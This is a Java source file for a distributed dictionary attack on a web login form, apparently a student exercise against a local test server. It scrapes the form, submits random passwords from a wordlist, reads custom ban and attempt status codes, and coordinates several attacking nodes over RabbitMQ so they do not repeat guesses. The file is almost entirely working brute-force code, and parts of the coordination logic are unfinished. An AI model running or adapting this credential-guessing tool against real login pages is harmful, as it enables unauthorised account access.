import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.FileReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.UnsupportedEncodingException;
import java.net.CookieHandler;
import java.net.CookieManager;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.List;
import java.util.Random;
import java.util.concurrent.TimeoutException;

import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;
import org.jsoup.nodes.Element;
import org.jsoup.select.Elements;

import com.rabbitmq.client.AMQP;
import com.rabbitmq.client.BuiltinExchangeType;
import com.rabbitmq.client.Channel;
import com.rabbitmq.client.Connection;
import com.rabbitmq.client.ConnectionFactory;
import com.rabbitmq.client.Consumer;
import com.rabbitmq.client.DefaultConsumer;
import com.rabbitmq.client.Envelope;

public class Attaccker {

	private List<String> cookies;
	private HttpURLConnection conn;

	private final String USER_AGENT = "Mozilla/5.0";
	private String url;
	private String login;
	private String dictonary;
	private boolean passwFound;
	private boolean ban;
	private boolean attempts;

	private String exName;
	private ConnectionFactory factory;
	private Connection connection;
	private Channel channel;
	// private String message;
	private String name;
	private String queueName;
	private String mexStr;

	private ArrayList<String> indexRecived = new ArrayList<String>(); // indici delle password ricevute da altri client

	private String passwToSend[] = new String[3]; // array che contiene gli indici delle password che verranno mandate
													// tramite POST
	private int response[] = new int[3]; // array che contiene gli stati http

	public Attaccker(String url, String login, String dictonary, String exName, String name)
			throws IOException, TimeoutException {

		this.url = url;
		this.login = login;
		this.dictonary = dictonary;
		this.passwFound = false;
		this.ban = false;
		this.attempts = false;

		this.exName = exName;
		// this.message = message;
		this.name = name;

		factory = new ConnectionFactory();
		factory.setHost("localhost");
		connection = factory.newConnection();
		this.channel = connection.createChannel();

		this.channel.exchangeDeclare(this.exName, BuiltinExchangeType.FANOUT);
		queueName = channel.queueDeclare().getQueue();
		this.channel.queueBind(queueName, this.exName, "");

	}

	// String result = http.GetPageContent(login);
	// System.out.println(result);

	public void start() throws Exception {

		// make sure cookies is turn on
		CookieHandler.setDefault(new CookieManager());

		// 1. Send a "GET" request, so that you can extract the form's data.
		String page = this.GetPageContent(url);

		// String[] data = readDictonaryAttack(dictonary);
		ArrayList<String> data = readDictonaryAttack(dictonary);

		passwToSend = setNewPasswToSend(indexRecived, data);

		// 2. Construct above post's content and then send a POST request for
		// authentication

		for (int i = 0; i < 3; i++) {
			String postParams = this.getFormParams(page, "prova", passwToSend[i]);
			response[i] = this.sendPost(login, postParams);
		}

		// Qui si deve considerare response[] ed agire di conseguenza.
		for (int i = 0; i < response.length; i++) {
			if (response[i] == 200) {
				// invio indice password ai nodi: index[i] è la password
				passwFound = true;
			}
			if (response[i] == 271) {
				// 0. invio l'indice provato agli altri nodi
				// 1. Aggiornare 3 nuovi indici per le password
				attempts = true;
			}
			if (response[i] == 270) {
				// 0. invio indici provati agli altri nodi
				// 1. Aggiornare 3 nuovi indici per le password
				// 2. sleep x secondi prima di ritentare.
				ban = true;
			}
		}
	}

	private ArrayList<String> readDictonaryAttack(String path) throws IOException {

		String line = "";
		ArrayList<String> lines = new ArrayList<String>();
		BufferedReader bf = new BufferedReader(new FileReader(path));

		while ((line = bf.readLine()) != null) {
			lines.add(line);
		}
		bf.close();

		return lines;
		// return lines.toArray(new String[] {});

	}

	private String[] setNewPasswToSend(ArrayList<String> indexRecived, ArrayList<String> data) {

		Random random = new Random();
		// data.get(random.nextInt(data.size()));
		// scelta indici random da dizionario

		String[] passwords = new String[3];
		for (int i = 0; i < 3; i++) {

			passwords[i] = data.get(random.nextInt(data.size()));
			// index[i] = (int) (Math.random() * (data.length));
			while (indexRecived.contains(passwords[i]))
				passwords[i] = data.get(random.nextInt(data.size()));

		}

		return passwords;
	}

	private int sendPost(String url, String postParams) throws Exception {

		URL obj = new URL(url);
		conn = (HttpURLConnection) obj.openConnection();

		// Acts like a browser
		conn.setUseCaches(false);
		conn.setRequestMethod("POST");
		conn.setRequestProperty("Host", "localhost:8080");
		conn.setRequestProperty("User-Agent", USER_AGENT);
		conn.setRequestProperty("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
		conn.setRequestProperty("Accept-Language", "en-US,en;q=0.5");
		/*
		 * for (String cookie : this.cookies) { conn.addRequestProperty("Cookie",
		 * cookie.split(";", 1)[0]); }
		 */
		conn.setRequestProperty("Connection", "keep-alive");
		conn.setRequestProperty("Referer", "http://localhost:8080/Distribuiti/login.html");
		conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
		conn.setRequestProperty("Content-Length", Integer.toString(postParams.length()));

		conn.setDoOutput(true);
		conn.setDoInput(true);

		// Send post request
		DataOutputStream wr = new DataOutputStream(conn.getOutputStream());
		wr.writeBytes(postParams);
		wr.flush();
		wr.close();

		int responseCode = conn.getResponseCode();
		System.out.println("\nSending 'POST' request to URL : " + url);
		System.out.println("Post parameters : " + postParams);
		System.out.println("Response Code : " + responseCode);

		BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
		String inputLine;
		StringBuffer response = new StringBuffer();

		while ((inputLine = in.readLine()) != null) {
			response.append(inputLine);
		}
		in.close();
		// System.out.println(response.toString());

		return responseCode;
	}

	private String GetPageContent(String url) throws Exception {

		URL obj = new URL(url);
		conn = (HttpURLConnection) obj.openConnection();

		// default is GET
		conn.setRequestMethod("GET");

		conn.setUseCaches(false);

		// act like a browser
		conn.setRequestProperty("User-Agent", USER_AGENT);
		conn.setRequestProperty("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
		conn.setRequestProperty("Accept-Language", "en-US,en;q=0.5");
		if (cookies != null) {
			for (String cookie : this.cookies) {
				conn.addRequestProperty("Cookie", cookie.split(";", 1)[0]);
			}
		}
		int responseCode = conn.getResponseCode();
		System.out.println("\nSending 'GET' request to URL : " + url);
		System.out.println("Response Code : " + responseCode);

		BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
		String inputLine;
		StringBuffer response = new StringBuffer();

		while ((inputLine = in.readLine()) != null) {
			response.append(inputLine);
		}
		in.close();

		// Get the response cookies
		setCookies(conn.getHeaderFields().get("Set-Cookie"));

		return response.toString();

	}

	private String getFormParams(String html, String username, String password) throws UnsupportedEncodingException {

		System.out.println("Extracting form's data...");

		Document doc = Jsoup.parse(html);

		// Google form id
		Element loginform = doc.getElementById("formLogin");
		Elements inputElements = loginform.getElementsByTag("input");
		inputElements.remove(2);
		List<String> paramList = new ArrayList<String>();
		for (Element inputElement : inputElements) {
			String key = inputElement.attr("name");
			String value = inputElement.attr("value");

			if (key.equals("user"))
				value = username;
			else if (key.equals("pwd"))
				value = password;
			paramList.add(key + "=" + URLEncoder.encode(value, "UTF-8"));
		}

		// build parameters list
		StringBuilder result = new StringBuilder();

		for (String param : paramList) {
			if (result.length() == 0) {
				result.append(param);
			} else {
				result.append("&" + param);
			}
		}
		return result.toString();
	}

	private void setCookies(List<String> cookies) {
		this.cookies = cookies;
	}

	private void sendMessage(String message) throws UnsupportedEncodingException, IOException {

		this.channel.basicPublish(this.exName, "", null, message.getBytes("UTF-8"));
		System.out.println(name + " MANDA: " + message);
	}

	public void receivedMessage() throws IOException, TimeoutException {

		System.out.println(name + " Waiting for messages. To exit press CTRL+C");

		Consumer consumer = new DefaultConsumer(channel) {
			@Override
			public void handleDelivery(String consumerTag, Envelope envelope, AMQP.BasicProperties properties,
					byte[] body) throws IOException {
				String mexReceived = new String(body, "UTF-8");
				// System.out.println(name + " Received: " + mexReceived);
				indexRecived.add(mexReceived);
			}
		};

		this.channel.basicConsume(this.queueName, true, consumer);
	}

}
